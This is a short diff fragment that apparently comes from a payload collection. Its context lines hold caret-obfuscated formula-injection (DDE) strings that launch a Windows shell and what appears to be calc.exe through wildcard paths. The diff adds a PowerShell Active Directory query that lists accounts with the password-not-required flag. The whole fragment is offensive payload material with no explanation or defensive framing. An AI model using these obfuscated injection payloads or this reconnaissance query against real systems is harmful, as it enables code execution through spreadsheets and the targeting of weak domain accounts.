@@ -3,3 +3,5 @@
 REM:let me mad:&@p^o^w^e^r^shell ^C^':'\\\\'/'\'*/'\'*'^2^/'\/////'^c^'*'^c^.?'^x^'?
 
 =cmd|'/c REM.&&@p^o^w^e^r^s^h^e^l^l c:/*/*2/?al?.?x?"'!_xlbgnm.A1
+
+'Get-ADUser -Filter 'useraccountcontrol -band 32' -Properties useraccountcontrol | FT Name'
